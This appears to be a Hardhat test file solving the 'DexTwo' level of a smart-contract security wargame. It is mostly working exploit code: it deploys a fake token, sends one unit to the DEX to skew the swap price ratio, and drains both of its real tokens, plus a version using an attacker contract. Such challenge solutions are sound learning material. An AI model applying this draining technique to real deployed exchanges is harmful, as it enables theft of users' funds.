import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { expect } from "chai";

import { DexTwo, DexTwoFactory, DexTwoFactory__factory, DexTwo__factory } from "../typechain-types";
import { MyDex2Attack, MyDex2Attack__factory } from "../typechain-types";
import { SwappableTokenTwo, SwappableTokenTwo__factory } from "../typechain-types";
import { FixtureContext, FixtureLevel, deployEssentials, deployLevel } from "./fixtures";
import { completeLevel } from "./helpers";

describe("23. DexTwo", function () {
  let context: FixtureContext;
  let level: FixtureLevel<DexTwoFactory, DexTwo>;

  beforeEach(async function () {
    context = await loadFixture(deployEssentials);
    level = await deployLevel(context, DexTwoFactory__factory, (address, signer) =>
      DexTwo__factory.connect(address, signer),
    );
  });

  it("should be attacked successfully through external calls", async function () {
    // get DEX2's tokens addresses
    const token1: SwappableTokenTwo = SwappableTokenTwo__factory.connect(await level.instance.token1(), context.player);
    const token2: SwappableTokenTwo = SwappableTokenTwo__factory.connect(await level.instance.token2(), context.player);

    const fakeTokenFactory: SwappableTokenTwo__factory = new SwappableTokenTwo__factory(context.player);

    const attack = async (to: SwappableTokenTwo) => {
      const fakeToken: SwappableTokenTwo = await fakeTokenFactory.deploy(level.instance, "FAKETOK", "FAKETOK", 1000);
      await fakeToken.waitForDeployment();

      // swap formula is: amountTo = amountFrom * balanceTo / balanceFrom
      // transfer 1 fake token to DEX2 in order to make its balanceFrom = 1
      let tx = await fakeToken.transfer(level.instance, 1);
      await tx.wait();
      expect(await fakeToken.balanceOf(level.instance)).to.be.eq(1);

      // approve DEX2 to spend 1 attacker's fake token
      tx = await fakeToken.approve(level.instance, 1);
      await tx.wait();

      tx = await level.instance.swap(fakeToken, to, 1);
      await tx.wait();
    };

    await attack(token1);
    expect(await token1.balanceOf(context.player)).to.be.eq(110);
    expect(await token1.balanceOf(level.instance)).to.be.eq(0);

    await attack(token2);
    expect(await token2.balanceOf(context.player)).to.be.eq(110);
    expect(await token2.balanceOf(level.instance)).to.be.eq(0);

    await completeLevel(context, level);
  });

  it("should be attacked successfully through attacker contract", async function () {
    // get DEX2's tokens addresses
    const token1: SwappableTokenTwo = SwappableTokenTwo__factory.connect(await level.instance.token1(), context.player);
    const token2: SwappableTokenTwo = SwappableTokenTwo__factory.connect(await level.instance.token2(), context.player);

    // deploy attacker contract
    const attackFactory: MyDex2Attack__factory = new MyDex2Attack__factory(context.player);
    const attackContract: MyDex2Attack = await attackFactory.deploy(level.instance);
    await attackContract.waitForDeployment();

    expect(await token1.balanceOf(level.instance)).to.be.eq(0);
    expect(await token2.balanceOf(level.instance)).to.be.eq(0);
    expect(await token1.balanceOf(attackContract)).to.be.eq(100);
    expect(await token2.balanceOf(attackContract)).to.be.eq(100);

    await completeLevel(context, level);
  });
});
